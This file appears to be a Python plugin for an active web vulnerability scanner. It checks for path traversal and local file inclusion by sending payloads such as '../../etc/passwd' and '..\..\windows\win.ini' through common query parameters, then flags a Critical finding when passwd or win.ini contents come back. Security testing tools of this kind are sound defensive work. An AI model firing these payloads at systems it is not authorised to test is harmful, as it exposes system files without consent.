
from dataclasses import dataclass, field
from typing import Dict, Any, List
import aiohttp, urllib.parse as up

CAPS={"passive": False, "active": True, "requires_auth": False, "oast": False, "dangerous": False}

@dataclass
class Finding:
    title: str
    description: str
    severity: str
    evidence: Dict[str, Any] = field(default_factory=dict)
    plugin: str = "path_traversal_lfi"

PARAMS=["file","path","page","include","template"]

LINUX = ["../../etc/passwd","..%2f..%2fetc%2fpasswd"]
WIN   = ["..\\..\\windows\\win.ini","..%5c..%5cwindows%5cwin.ini"]

def _is_passwd(text:str)->bool:
    return "root:x:0:0:" in text or "daemon:x:" in text

def _is_winini(text:str)->bool:
    t=text.lower(); return "[fonts]" in t or "[extensions]" in t

class Plugin:
    def __init__(self, target: str, session: aiohttp.ClientSession, config: dict):
        self.target=target; self.session=session; self.config=config

    async def run(self)->List[Finding]:
        out: List[Finding] = []
        for p in PARAMS:
            for payload in LINUX+WIN:
                q=up.urlencode({p: payload})
                url=self.target + ("&" if "?" in self.target else "?") + q
                try:
                    async with self.session.get(url) as r:
                        txt=await r.text()
                        if _is_passwd(txt) or _is_winini(txt):
                            out.append(Finding(
                                title="Path Traversal / LFI",
                                description=f"Reading local file via '{p}'",
                                severity="Critical",
                                evidence={"url":url}
                            ))
                            return out
                except Exception:
                    continue
        return out
